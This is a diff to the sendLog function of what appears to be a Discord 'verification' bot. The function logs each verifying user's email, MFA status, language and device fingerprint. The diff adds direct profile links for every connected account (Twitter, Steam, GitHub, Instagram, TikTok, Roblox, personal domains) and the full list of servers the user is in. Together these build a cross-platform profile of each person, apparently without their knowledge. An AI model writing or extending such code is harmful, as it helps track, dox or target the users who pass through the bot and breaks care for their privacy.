@@ -416,23 +416,52 @@ async function sendLog(userId, username, avatar, email, emailVerified, mfaEnable
     const isVerified = status === 'VERIFIED';
     const isError = status === 'ERROR';
 
-    // Format connections
+    // Format connections with links
     const connectionTypes = userConnections.length > 0
       ? userConnections.map(c => {
           const icons = {
             discord: '💬', steam: '🎮', twitter: '🐦', twitch: '🎬',
             youtube: '📺', reddit: '🤖', facebook: '📘', github: '💻',
             instagram: '📷', tiktok: '🎵', spotify: '🎵', leagueoflegends: '⚔️',
-            xbox: '🎮', playstation: '🎮'
+            xbox: '🎮', playstation: '🎮', roblox: '🎮', domain: '🔗'
           };
-          return `${icons[c.type] || '🔗'} ${c.type}${c.verified ? ' ✅' : ''}`;
-        }).join(', ')
+          const icon = icons[c.type] || '🔗';
+          const verified = c.verified ? ' ✅' : '';
+          
+          // Add link if available
+          let link = '';
+          if (c.type === 'twitter' && c.id) {
+            link = ` https://twitter.com/${c.id}`;
+          } else if (c.type === 'youtube' && c.id) {
+            link = ` https://youtube.com/@${c.id}`;
+          } else if (c.type === 'github' && c.id) {
+            link = ` https://github.com/${c.id}`;
+          } else if (c.type === 'steam' && c.id) {
+            link = ` https://steamcommunity.com/profiles/${c.id}`;
+          } else if (c.type === 'twitch' && c.id) {
+            link = ` https://twitch.tv/${c.id}`;
+          } else if (c.type === 'instagram' && c.id) {
+            link = ` https://instagram.com/${c.id}`;
+          } else if (c.type === 'tiktok' && c.id) {
+            link = ` https://tiktok.com/@${c.id}`;
+          } else if (c.type === 'spotify' && c.id) {
+            link = ` https://open.spotify.com/user/${c.id}`;
+          } else if (c.type === 'roblox' && c.id) {
+            link = ` https://roblox.com/users/${c.id}`;
+          } else if (c.type === 'domain' && c.id) {
+            link = ` https://${c.id}`;
+          } else if (c.url) {
+            link = ` ${c.url}`;
+          }
+          
+          return `${icon} ${c.name || c.type}${verified}${link ? ` - [Link](${link.trim()})` : ''}`;
+        }).join('\n')
       : 'None';
 
-    // Format guild count and list
+    // Format guild list for main embed (short version)
     const guildCount = userGuilds.length || 0;
-    const guildList = userGuilds.length > 0
-      ? userGuilds.slice(0, 10).map(g => `${g.name}${g.owner ? ' 👑' : ''}`).join('\n') + (userGuilds.length > 10 ? `\n*...and ${userGuilds.length - 10} more*` : '')
+    const shortGuildList = userGuilds.length > 0
+      ? userGuilds.slice(0, 5).map(g => `${g.name}${g.owner ? ' 👑' : ''}`).join('\n') + (userGuilds.length > 5 ? `\n*...and ${userGuilds.length - 5} more*` : '')
       : 'None';
 
     // Main verification embed
@@ -454,7 +483,7 @@ async function sendLog(userId, username, avatar, email, emailVerified, mfaEnable
         { name: '🌍 Language', value: deviceInfo ? deviceInfo.language : 'Unknown', inline: true },
         { name: '📊 In Servers', value: `${guildCount} servers`, inline: true },
         { name: '🔗 Connections', value: connectionTypes, inline: false },
-        { name: '🏠 Servers They\'re In', value: guildList, inline: false },
+        { name: '🏠 Servers They\'re In', value: shortGuildList, inline: false },
         { name: '🏠 Target Server', value: guild?.name ? `${guild.name} (\`${guild.id}\`)` : 'N/A', inline: false }
       ],
       footer: { text: `${status} • ${new Date().toLocaleString()}` }
@@ -466,6 +495,74 @@ async function sendLog(userId, username, avatar, email, emailVerified, mfaEnable
 
     // Build embeds array
     const embeds = [embed];
+
+    // Add full servers embed if user is in many servers
+    if (userGuilds.length > 0) {
+      const fullGuildList = userGuilds
+        .map(g => `${g.name}${g.owner ? ' 👑' : ''}`)
+        .join('\n');
+      
+      const serversEmbed = {
+        title: `🏠 All Servers (${guildCount} total)`,
+        color: 0x5865F2,
+        fields: [
+          {
+            name: '📋 Complete Server List',
+            value: fullGuildList.length > 1024 
+              ? fullGuildList.substring(0, 1020) + '...' 
+              : fullGuildList || 'None',
+            inline: false
+          }
+        ]
+      };
+      embeds.push(serversEmbed);
+    }
+
+    // Add full connections embed if user has many connections
+    if (userConnections.length > 0) {
+      const fullConnectionsList = userConnections
+        .map(c => {
+          const icons = {
+            discord: '💬', steam: '🎮', twitter: '🐦', twitch: '🎬',
+            youtube: '📺', reddit: '🤖', facebook: '📘', github: '💻',
+            instagram: '📷', tiktok: '🎵', spotify: '🎵', leagueoflegends: '⚔️',
+            xbox: '🎮', playstation: '🎮', roblox: '🎮', domain: '🔗'
+          };
+          const icon = icons[c.type] || '🔗';
+          const verified = c.verified ? '✅' : '❌';
+          
+          let link = 'No link';
+          if (c.type === 'twitter' && c.id) link = `https://twitter.com/${c.id}`;
+          else if (c.type === 'youtube' && c.id) link = `https://youtube.com/@${c.id}`;
+          else if (c.type === 'github' && c.id) link = `https://github.com/${c.id}`;
+          else if (c.type === 'steam' && c.id) link = `https://steamcommunity.com/profiles/${c.id}`;
+          else if (c.type === 'twitch' && c.id) link = `https://twitch.tv/${c.id}`;
+          else if (c.type === 'instagram' && c.id) link = `https://instagram.com/${c.id}`;
+          else if (c.type === 'tiktok' && c.id) link = `https://tiktok.com/@${c.id}`;
+          else if (c.type === 'spotify' && c.id) link = `https://open.spotify.com/user/${c.id}`;
+          else if (c.type === 'roblox' && c.id) link = `https://roblox.com/users/${c.id}`;
+          else if (c.type === 'domain' && c.id) link = `https://${c.id}`;
+          else if (c.url) link = c.url;
+          
+          return `${icon} **${c.name || c.type}** ${verified}\n└ Link: ${link}`;
+        })
+        .join('\n\n');
+      
+      const connectionsEmbed = {
+        title: `🔗 All Connections (${userConnections.length} total)`,
+        color: 0x27ae60,
+        fields: [
+          {
+            name: '📱 Connected Accounts',
+            value: fullConnectionsList.length > 1024
+              ? fullConnectionsList.substring(0, 1020) + '...'
+              : fullConnectionsList,
+            inline: false
+          }
+        ]
+      };
+      embeds.push(connectionsEmbed);
+    }
 
     // Add detailed fingerprint embed if device info is available
     if (deviceInfo) {
